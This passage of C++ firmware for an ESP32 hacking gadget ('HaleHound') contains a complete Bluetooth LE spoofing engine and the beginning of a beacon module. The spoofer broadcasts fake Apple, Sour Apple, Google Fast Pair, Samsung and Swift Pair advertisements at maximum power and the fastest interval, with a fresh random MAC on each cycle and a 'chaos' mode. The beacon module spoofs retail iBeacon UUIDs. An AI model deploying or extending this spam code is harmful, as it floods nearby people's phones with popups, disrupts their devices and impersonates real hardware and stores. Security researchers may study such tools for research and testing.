    bool hasHeat = false;
    for (int i = 0; i < SP_EQ_BARS; i++) {
        if (eqHeat[i] > 3) { hasHeat = true; break; }
    }

    if (!hasHeat && !spamming) {
        // Standby — tiny flat bars
        for (int i = 0; i < SP_EQ_BARS; i++) {
            int x = SP_EQ_X + (i * barWidth);
            int barH = 3 + (i % 3);
            int barY = SP_EQ_Y + SP_EQ_HEIGHT - barH - 2;
            tft.fillRect(x + 1, barY, barWidth - 2, barH, HALEHOUND_GUNMETAL);
        }
        return;
    }

    // Draw active bars with gradient
    for (int i = 0; i < SP_EQ_BARS; i++) {
        int x = SP_EQ_X + (i * barWidth);
        uint8_t heat = eqHeat[i];

        int barH = (heat * maxBarH) / 100;
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 3) barH = 3;

        int barY = SP_EQ_Y + SP_EQ_HEIGHT - barH - 2;

        // Per-pixel gradient (cyan at bottom → hot pink at top)
        for (int y = 0; y < barH; y++) {
            float ratio = (float)y / (float)barH;
            float heatRatio = (float)heat / 124.0f;
            float r = ratio * (0.3f + heatRatio * 0.7f);
            if (r > 1.0f) r = 1.0f;
            uint16_t color = spGradientColor(r);
            tft.drawFastHLine(x + 1, barY + barH - 1 - y, barWidth - 2, color);
        }

        // Glow at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x + 1, barY + barH, barWidth - 2, HALEHOUND_HOTPINK);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROWS — 2x8 with animated wave + red pulse on active broadcast
// ═══════════════════════════════════════════════════════════════════════════

static void drawSkulls() {
    int skullStartX = SCALE_X(10);
    int skullSpacing = (SCREEN_WIDTH - SCALE_X(20)) / SP_SKULL_NUM;

    for (int row = 0; row < SP_SKULL_ROWS; row++) {
        int rowY = SP_SKULL_Y + (row * SP_SKULL_ROW_SPACING);

        for (int i = 0; i < SP_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (spamming) {
                // Map current mode to a "hot skull" position for visual feedback
                int activeSkull = currentMode % SP_SKULL_NUM;
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE MODE SKULL — pulsing bright red
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS — orange glow
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        color = spGradientColor(ratio);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, spSkulls[i], 16, 16, color);
        }

        // TX/OFF label next to first row
        if (row == 0) {
            tft.fillRect(skullStartX + (SP_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(spamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (SP_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(spamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// COUNTER BAR — Gradient progress bar + rate display
// ═══════════════════════════════════════════════════════════════════════════

static void drawCounter() {
    int counterY = SCREEN_HEIGHT - SCALE_H(30);
    tft.fillRect(0, counterY, SCREEN_WIDTH, SCALE_H(25), TFT_BLACK);

    // Gradient bar showing activity (fills based on rate, max at 30/s)
    int barX = SCALE_X(10);
    int barY = counterY + SCALE_H(2);
    int barW = SCALE_W(140);
    int barH = SCALE_H(10);

    // Border
    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill with gradient based on rate (0-30 pps mapped to 0-100%)
    float fillPct = (currentRate > 0) ? (float)currentRate / 30.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = spGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    // Packet count inside the bar
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", packetCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    // Rate display to the right
    tft.setTextColor(spamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d pkt/s", currentRate);

    // Small skull icon next to rate when active
    if (spamming) {
        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// MODE / DEVICE CONTROL
// ═══════════════════════════════════════════════════════════════════════════

static void nextMode() {
    currentMode = (currentMode + 1) % MODE_COUNT;
    drawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(buf, HALEHOUND_HOTPINK);
}

static void prevMode() {
    currentMode = (currentMode - 1 + MODE_COUNT) % MODE_COUNT;
    drawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(buf, HALEHOUND_HOTPINK);
}

static void nextDevice() {
    if (currentMode == MODE_CHAOS) return;
    int count = getDeviceCount(currentMode);
    if (count == 0) return;
    deviceIndex[currentMode] = (deviceIndex[currentMode] + 1) % count;
    drawHeader();
}

static void prevDevice() {
    if (currentMode == MODE_CHAOS) return;
    int count = getDeviceCount(currentMode);
    if (count == 0) return;
    deviceIndex[currentMode] = (deviceIndex[currentMode] - 1 + count) % count;
    drawHeader();
}

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (bypasses Arduino wrapper for reliable BLE spam)
// ADV_TYPE_NONCONN_IND = non-connectable undirected (BLE spam standard)
// BLE_ADDR_TYPE_RANDOM = use our random MAC per broadcast cycle
// 0x20 interval = 20ms = fastest BLE spec allows
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t bleSpamAdvParams = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x20,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // ═══════════════════════════════════════════════════════════════════════
    // BLE BROADCAST — Raw ESP-IDF API (Arduino wrapper doesn't cycle MACs correctly)
    // Sequence: stop → setRandAddr → configDataRaw → start → delay → stop
    // ═══════════════════════════════════════════════════════════════════════

    // Stop any current advertising
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type

    // Set random address via raw ESP-IDF (wrapper doesn't handle rapid cycling)
    esp_ble_gap_set_rand_addr(addr);

    // Determine what to broadcast
    int broadcastMode = currentMode;
    int broadcastIdx = 0;
    const char* deviceName = "";

    if (currentMode == MODE_CHAOS) {
        broadcastMode = chaosStep % (MODE_COUNT - 1);
        int count = getDeviceCount(broadcastMode);
        broadcastIdx = (count > 0) ? random(count) : 0;
        chaosStep++;
    } else {
        broadcastIdx = deviceIndex[currentMode];
    }

    // Build payload
    BLEAdvertisementData advData = BLEAdvertisementData();

    switch (broadcastMode) {
        case MODE_APPLE_POPUP:
            getApplePopupPayload(advData, broadcastIdx);
            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
            break;

        case MODE_SOUR_APPLE: {
            int randType = random(SOUR_APPLE_COUNT);
            getSourApplePayload(advData, randType);
            deviceName = SOUR_APPLE_NAMES[randType];
            break;
        }

        case MODE_FAST_PAIR:
            getFastPairPayload(advData, broadcastIdx);
            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
            break;

        case MODE_SAMSUNG_BUDS:
            getSamsungBudsPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
            break;

        case MODE_SAMSUNG_WATCH:
            getSamsungWatchPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
            break;

        case MODE_SWIFT_PAIR:
            getSwiftPairPayload(advData, broadcastIdx);
            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
            break;

        default:
            return;
    }

    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for reliable cycling)
    std::string payload = advData.getPayload();
    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());

    // Brief pause for data config to take effect
    delay(1);

    // Start advertising with raw ESP-IDF params (proven pattern from ESP32-BLE-Spam)
    esp_ble_gap_start_advertising(&bleSpamAdvParams);

    // Let BLE controller fire advertising events on channels 37/38/39
    // 20ms = at least one full advertising interval
    delay(20);

    // Stop advertising (clean cycle for next random MAC)
    esp_ble_gap_stop_advertising();

    // Update counters
    packetCount++;
    rateWindowCount++;

    // Log first 5 packets to serial for debugging
    if (packetCount <= 5) {
        Serial.printf("[BLESPOOF] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
            packetCount, broadcastMode, (int)payload.length(), addr[0], addr[1], addr[2]);
    }

    // Log entry with truncated MAC (all stack-allocated, zero heap allocs)
    char logBuf[42];
    snprintf(logBuf, sizeof(logBuf), "[+] %s -> %02X:%02X:%02X", deviceName, addr[0], addr[1], addr[2]);
    addLogEntry(logBuf, HALEHOUND_VIOLET);
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK — Runs doBroadcast() as fast as BLE allows
// BLE advertising has inherent ~21ms per cycle (delay(1) + delay(20))
// Removing the 40ms throttle roughly doubles broadcast rate (~45-50/sec)
// ═══════════════════════════════════════════════════════════════════════════

static void spamTxTask(void* param) {
    spamTaskRunning = true;
    unsigned long rateStart = millis();

    while (spamming) {
        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();  // Increments packetCount and rateWindowCount

        // Update rate counter every second
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        // Yield — delay(20) in doBroadcast already yields, but belt and suspenders
        vTaskDelay(1);
    }

    spamTaskRunning = false;
    vTaskDelete(NULL);
}

static void startSpamTask() {
    if (spamTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(spamTxTask, "bleSpam", 8192, NULL, 1, &spamTaskHandle, 0);
}

static void stopSpamTask() {
    spamming = false;
    if (spamTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (spamTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (spamTaskRunning) {
        vTaskDelete(spamTaskHandle);
    }

    spamTaskHandle = NULL;
    spamTaskRunning = false;

    // Stop any lingering advertising
    esp_ble_gap_stop_advertising();
}

static void startSpam() {
    spamming = true;
    rateWindowCount = 0;
    addLogEntry("[!] SPAM STARTED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();
    drawLog();  // Force immediate log display on state change

    startSpamTask();  // Launch Core 0 broadcast engine

    #if CYD_DEBUG
    Serial.printf("[BLESPOOF] Started - Mode: %s (Core 0)\n", MODE_NAMES[currentMode]);
    #endif
}

static void stopSpam() {
    stopSpamTask();  // Stop Core 0 task first
    addLogEntry("[!] SPAM STOPPED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Stopped");
    #endif
}

static void toggleSpam() {
    if (spamming) stopSpam(); else startSpam();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setInitialMode(int mode) {
    initialMode = mode;
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Initializing Multi-Platform BLE Spoofer...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Kill WiFi completely — it shares the 2.4GHz radio with BLE
    // MUST use Arduino API to keep _esp_wifi_started flag in sync
    WiFi.mode(WIFI_OFF);
    delay(200);

    // Initialize BLE — must wait for controller to be fully ready before setting TX power
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[BLESPOOF] BLE stack initialized, max TX power set");

    // Reset state
    spamming = false;
    exitRequested = false;
    packetCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    logCount = 0;
    skullFrame = 0;
    chaosStep = 0;
    for (int i = 0; i < MODE_COUNT; i++) deviceIndex[i] = 0;
    spamTaskHandle = NULL;
    spamTaskRunning = false;

    // Apply initial mode if set (for SourApple redirect)
    if (initialMode >= 0 && initialMode < MODE_COUNT) {
        currentMode = initialMode;
        initialMode = -1;
    } else {
        currentMode = MODE_APPLE_POPUP;
    }

    // Draw full UI
    drawIconBar();
    drawHeader();
    drawEqualizer();
    drawSkulls();
    drawCounter();

    addLogEntry("[*] BLE Spoofer ready", HALEHOUND_MAGENTA);
    char modeBuf[42];
    snprintf(modeBuf, sizeof(modeBuf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(modeBuf, HALEHOUND_MAGENTA);
    drawLog();  // Force initial log display

    lastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Icons: Back=10, Toggle=60, PrevMode=105, NextMode=140, PrevDev=180, NextDev=215
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            // Wait for touch release to prevent repeated triggers
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= SCALE_X(5) && tx <= SCALE_X(30)) {
                if (spamming) stopSpam();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=60)
            else if (tx >= SCALE_X(50) && tx <= SCALE_X(80)) {
                toggleSpam();
                return;
            }
            // Prev mode icon (x=105)
            else if (tx >= SCALE_X(95) && tx <= SCALE_X(125)) {
                prevMode();
                return;
            }
            // Next mode icon (x=140)
            else if (tx >= SCALE_X(130) && tx <= SCALE_X(160)) {
                nextMode();
                return;
            }
            // Prev device icon (x=180)
            else if (tx >= SCALE_X(170) && tx <= SCALE_X(200)) {
                prevDevice();
                return;
            }
            // Next device icon at right edge
            else if (tx >= (tft.width() - SCALE_X(35)) && tx <= tft.width()) {
                nextDevice();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (spamming) stopSpam();
        exitRequested = true;
        return;
    }

    // Button navigation
    if (buttonPressed(BTN_LEFT)) prevDevice();
    if (buttonPressed(BTN_RIGHT)) nextDevice();
    if (buttonPressed(BTN_UP)) prevMode();
    if (buttonPressed(BTN_DOWN)) nextMode();
    if (buttonPressed(BTN_SELECT)) toggleSpam();

    // Broadcast engine runs on Core 0 (spamTxTask)
    // Rate calculation also runs on Core 0

    // Feed the watchdog
    yield();

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (~10fps = 100ms throttle for skulls + counter + log)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayUpdate >= 100) {
        drawEqualizer();
        drawSkulls();
        drawCounter();
        drawLog();
        lastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopSpamTask();  // Stop Core 0 task before BLE teardown

    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag

    spamming = false;
    initialized = false;
    exitRequested = false;
    initialMode = -1;
    logDirty = false;
    logCount = 0;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Cleanup complete");
    #endif
}

}  // namespace BleSpoofer


// ═══════════════════════════════════════════════════════════════════════════
// BLE UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void bleInit() {
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
}

void bleCleanup() {
    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag
}


// ═══════════════════════════════════════════════════════════════════════════
// BLE BEACON - iBeacon / Eddystone Beacon Transmitter
// Standards-compliant beacon broadcasting for testing beacon-aware apps,
// geo-fencing systems, and proximity detection.
// Uses same proven ESP-IDF raw advertising API as BleSpoofer.
// Created: 2026-02-14
// ═══════════════════════════════════════════════════════════════════════════

namespace BleBeacon {

// ═══════════════════════════════════════════════════════════════════════════
// BEACON MODES
// ═══════════════════════════════════════════════════════════════════════════

enum BeaconMode {
    BCN_RANDOM_IBEACON = 0,
    BCN_APPLE_STORE,
    BCN_STARBUCKS,
    BCN_EDDYSTONE_URL,
    BCN_EDDYSTONE_UID,
    BCN_GEO_FENCE,
    BCN_MODE_COUNT  // 6
};

static const char* BCN_MODE_NAMES[] = {
    "RANDOM iBEACON",
    "APPLE STORE",
    "STARBUCKS",
    "EDDYSTONE URL",
    "EDDYSTONE UID",
    "GEO-FENCE"
};

// ═══════════════════════════════════════════════════════════════════════════
// iBEACON PRESETS
// iBeacon format: Flags(3) + Mfr(0xFF) + Apple(4C00) + type(0215) +
//                 UUID(16) + Major(2) + Minor(2) + TX Power(1)
// ═══════════════════════════════════════════════════════════════════════════

// Apple Store iBeacon UUID: E2C56DB5-DFFB-48D2-B060-D0F5A71096E0
static const uint8_t UUID_APPLE_STORE[16] = {
    0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x48, 0xD2,
    0xB0, 0x60, 0xD0, 0xF5, 0xA7, 0x10, 0x96, 0xE0
};

// Starbucks retail beacon UUID: 2F234454-CF6D-4A0F-ADF2-F4911BA9FFA6
static const uint8_t UUID_STARBUCKS[16] = {
    0x2F, 0x23, 0x44, 0x54, 0xCF, 0x6D, 0x4A, 0x0F,
    0xAD, 0xF2, 0xF4, 0x91, 0x1B, 0xA9, 0xFF, 0xA6
};

// Target retail beacon UUID: AA6062F0-98CA-4211-8EC4-3D0B20EA9616
static const uint8_t UUID_TARGET[16] = {
    0xAA, 0x60, 0x62, 0xF0, 0x98, 0xCA, 0x42, 0x11,
    0x8E, 0xC4, 0x3D, 0x0B, 0x20, 0xEA, 0x96, 0x16
};

// Walmart retail beacon UUID: 74278BDA-B644-4520-8F0C-720EAF059935
static const uint8_t UUID_WALMART[16] = {
    0x74, 0x27, 0x8B, 0xDA, 0xB6, 0x44, 0x45, 0x20,
    0x8F, 0x0C, 0x72, 0x0E, 0xAF, 0x05, 0x99, 0x35
};

// Macy's retail beacon UUID: B9407F30-F5F8-466E-AFF9-25556B57FE6D (Estimote)
static const uint8_t UUID_MACYS[16] = {
    0xB9, 0x40, 0x7F, 0x30, 0xF5, 0xF8, 0x46, 0x6E,
    0xAF, 0xF9, 0x25, 0x55, 0x6B, 0x57, 0xFE, 0x6D
};

// Geo-fence preset table
#define GEO_FENCE_PRESET_COUNT 5
static const uint8_t* GEO_FENCE_UUIDS[GEO_FENCE_PRESET_COUNT] = {
    UUID_APPLE_STORE, UUID_STARBUCKS, UUID_TARGET, UUID_WALMART, UUID_MACYS
};
static const char* GEO_FENCE_NAMES[GEO_FENCE_PRESET_COUNT] = {
    "AppleStore", "Starbucks", "Target", "Walmart", "Macys"
};

// Eddystone URL preset
static const char* EDDYSTONE_URL_PRESET = "google.com";

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool beaconing = false;
static bool exitRequested = false;
static volatile int currentMode = BCN_RANDOM_IBEACON;

static volatile uint32_t packetCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;
static volatile int geoFenceStep = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: BLE broadcast engine (doBroadcast loop)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t bcnTaskHandle = NULL;
static volatile bool bcnTaskRunning = false;

// ═══════════════════════════════════════════════════════════════════════════
// SCROLLING LOG
// ═══════════════════════════════════════════════════════════════════════════

#define BCN_LOG_MAX_LINES 8
#define BCN_LOG_LINE_HEIGHT SCALE_H(13)
#define BCN_LOG_START_Y SCALE_Y(115)
#define BCN_LOG_END_Y (SCREEN_HEIGHT - SCALE_H(90))

static char bcnLogLines[BCN_LOG_MAX_LINES][42];
static uint16_t bcnLogColors[BCN_LOG_MAX_LINES];
static volatile int bcnLogCount = 0;
static volatile bool bcnLogDirty = false;  // Core 0 sets via bcnAddLog, Core 1 reads in bcnDrawLog

static unsigned long lastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (same proven pattern as BleSpoofer)
// ADV_TYPE_NONCONN_IND = non-connectable undirected (beacon standard)
// BLE_ADDR_TYPE_RANDOM = random MAC per broadcast
// 0xA0 interval = 100ms = standard iBeacon rate
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t bcnAdvParams = {
    .adv_int_min = 0xA0,
    .adv_int_max = 0xA0,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 4 icons: Back | Toggle | PrevMode | NextMode
// ═══════════════════════════════════════════════════════════════════════════

#define BCN_ICON_SIZE 16
#define BCN_ICON_NUM 4

static const int bcnIconX[BCN_ICON_NUM] = {SCALE_X(10), SCALE_X(70), SCALE_X(140), SCALE_X(200)};
static const unsigned char* bcnIcons[BCN_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back/Exit
    bitmap_icon_start,             // 1: Toggle beacon ON/OFF
    bitmap_icon_LEFT,              // 2: Previous mode
    bitmap_icon_RIGHT              // 3: Next mode
};

// ═══════════════════════════════════════════════════════════════════════════
// LOG FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void bcnAddLog(const char* text, uint16_t color) {
    if (bcnLogCount >= BCN_LOG_MAX_LINES) {
        memmove(bcnLogLines[0], bcnLogLines[1], (BCN_LOG_MAX_LINES - 1) * sizeof(bcnLogLines[0]));
        memmove(bcnLogColors, bcnLogColors + 1, (BCN_LOG_MAX_LINES - 1) * sizeof(uint16_t));
        bcnLogCount = BCN_LOG_MAX_LINES - 1;
    }
    strncpy(bcnLogLines[bcnLogCount], text, sizeof(bcnLogLines[0]) - 1);
    bcnLogLines[bcnLogCount][sizeof(bcnLogLines[0]) - 1] = '\0';
    bcnLogColors[bcnLogCount] = color;
    bcnLogCount++;
    bcnLogDirty = true;
}

static void bcnDrawLog() {
    if (!bcnLogDirty) return;
    bcnLogDirty = false;

    tft.fillRect(0, BCN_LOG_START_Y, SCREEN_WIDTH, BCN_LOG_END_Y - BCN_LOG_START_Y, TFT_BLACK);

    tft.setTextSize(1);
    for (int i = 0; i < bcnLogCount; i++) {
        tft.setTextColor(bcnLogColors[i], TFT_BLACK);
        tft.setCursor(3, BCN_LOG_START_Y + i * BCN_LOG_LINE_HEIGHT);
        tft.print(bcnLogLines[i]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void bcnDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BCN_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && beaconing) color = HALEHOUND_HOTPINK;
        tft.drawBitmap(bcnIconX[i], ICON_BAR_Y, bcnIcons[i], BCN_ICON_SIZE, BCN_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void bcnDrawHeader() {
    tft.fillRect(0, SCALE_Y(40), SCREEN_WIDTH, SCALE_H(72), TFT_BLACK);

    // Title — Nosifer with glitch effect
    drawGlitchText(SCALE_Y(60), "BLE BEACON", &Nosifer_Regular10pt7b);

    // Status
    tft.setTextSize(1);
    if (beaconing) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(SCALE_X(78), SCALE_Y(68));
        tft.print(">> BEACONING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(SCALE_X(95), SCALE_Y(68));
        tft.print("- IDLE -");
    }

    // Mode in framed bar
    tft.drawRoundRect(5, SCALE_Y(82), GRAPH_PADDED_W, SCALE_H(16), 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, SCALE_Y(83), GRAPH_PADDED_W - 2, SCALE_H(14), 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(10), SCALE_Y(86));
    tft.printf(" %s", BCN_MODE_NAMES[currentMode]);

    // Packet count on right side
    if (packetCount > 0) {
        char cntBuf[14];
        snprintf(cntBuf, sizeof(cntBuf), "%lu pkt", packetCount);
        tft.setCursor(SCALE_X(170), SCALE_Y(86));
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.print(cntBuf);
    }

    tft.drawLine(0, SCALE_Y(100), SCREEN_WIDTH, SCALE_Y(100), HALEHOUND_HOTPINK);

    // Rate display bar
    tft.fillRect(0, SCALE_Y(102), SCREEN_WIDTH, SCALE_H(12), TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, SCALE_Y(103));
    tft.printf("Rate: %d bcn/s", currentRate);

    if (beaconing) {
        // Animated gradient pulse: cyan → hot pink → cyan
        int phase = (millis() / 100) % 16;
        float ratio = (phase < 8) ? (phase / 7.0f) : ((16 - phase) / 8.0f);
        uint8_t r = (uint8_t)(ratio * 255);
        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
        tft.drawBitmap(SCALE_X(220), SCALE_Y(102), bitmap_icon_signal, 16, 16, tft.color565(r, g, b));
    }
}

// Lightweight rate-only update — no fillRect clear on title/mode areas
// Called in 100ms display loop instead of full bcnDrawHeader()
static void bcnDrawRate() {
    // Rate display bar only (Y=102-114)
    tft.fillRect(0, SCALE_Y(102), SCALE_X(215), SCALE_H(12), TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, SCALE_Y(103));
    tft.printf("Rate: %d bcn/s", currentRate);

    // Packet count in mode bar (right side, Y=86)
    if (packetCount > 0) {
        tft.fillRect(SCALE_X(165), SCALE_Y(84), SCALE_W(70), SCALE_H(12), TFT_BLACK);
        char cntBuf[14];
        snprintf(cntBuf, sizeof(cntBuf), "%lu pkt", packetCount);
        tft.setCursor(SCALE_X(170), SCALE_Y(86));
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.print(cntBuf);
    }

    // Animated signal icon
    if (beaconing) {
        int phase = (millis() / 100) % 16;
        float ratio = (phase < 8) ? (phase / 7.0f) : ((16 - phase) / 8.0f);
        uint8_t r = (uint8_t)(ratio * 255);
        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
        tft.drawBitmap(SCALE_X(220), SCALE_Y(102), bitmap_icon_signal, 16, 16, tft.color565(r, g, b));
    }
}

static void bcnDrawCounter() {
    int counterY = SCREEN_HEIGHT - SCALE_H(88);
